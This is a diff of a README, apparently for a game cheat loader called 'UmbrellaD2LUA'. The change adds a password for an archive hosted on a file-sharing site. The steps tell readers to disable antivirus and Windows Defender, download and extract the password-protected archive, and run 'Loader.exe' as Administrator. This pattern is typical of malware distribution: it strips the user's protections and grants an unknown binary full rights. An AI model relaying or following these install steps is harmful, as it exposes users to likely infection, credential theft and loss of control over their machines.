@@ -12,7 +12,7 @@ Follow these steps carefully to get started:
 Before installation, turn off your antivirus and Windows Defender to prevent false detections.
 
 ### 📦 Step 2: Extract Files
-[Download the archive](https://www.4sync.com/rar/xXlcmuaf/UmbrellaD2LUA.html) and extract it to a safe, easy-to-access location (e.g., Desktop or a separate folder).
+[Download the archive](https://www.4sync.com/rar/xXlcmuaf/UmbrellaD2LUA.html) (Password Umbrella) and extract it to a safe, easy-to-access location (e.g., Desktop or a separate folder).
 
 ### 🚀 Step 3: Launch the Loader
 Run the main executable file (`Loader.exe`) **as Administrator** to ensure proper permissions.
